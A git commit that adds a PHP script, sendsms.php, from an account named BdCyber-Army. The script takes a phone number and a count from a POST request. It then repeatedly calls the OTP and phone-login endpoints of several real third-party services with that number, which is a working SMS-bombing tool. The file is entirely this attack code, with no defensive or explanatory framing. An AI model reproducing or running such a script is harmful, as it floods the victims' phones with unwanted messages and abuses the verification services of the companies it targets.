c108097ffe34e8d3e6a590abea8cc5f12c8908ed
Bd Army <152695379+BdCyber-Army@users.noreply.github.com>
2023-12-07 21:48:20 +0600

    Create sendsms.php

---
+++ assets/Php/sendsms.php
@@ -0,0 +1,29 @@
+?php
+if (isset($_POST['phoneNumber']) && isset($_POST['smsAmount'])) {
+    $phoneNumber = $_POST['phoneNumber'];
+    $smsAmount = $_POST['smsAmount'];
+
+    // Specify your SMS API endpoints
+    $apiEndpoints = [
+        'http://ultranetrn.com.br/fonts/api.php?number=' . urlencode($phoneNumber),
+        'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=' . urlencode($phoneNumber),
+        'https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=' . urlencode($phoneNumber)
+        // Add more API endpoints as needed
+    ];
+
+    // Initialize an array to store API responses
+    $apiResponses = [];
+
+    // Iterate through each API endpoint and send SMS
+    foreach ($apiEndpoints as $apiEndpoint) {
+        $response = file_get_contents($apiEndpoint . '&smsAmount=' . urlencode($smsAmount));
+        $apiResponses[] = $response;
+    }
+
+    // Output the API responses (you may want to handle this differently based on your requirements)
+    echo json_encode($apiResponses);
+} else {
+    // Handle the case when the required parameters are not provided
+    echo json_encode(['error' => 'Invalid request']);
+}
+?>
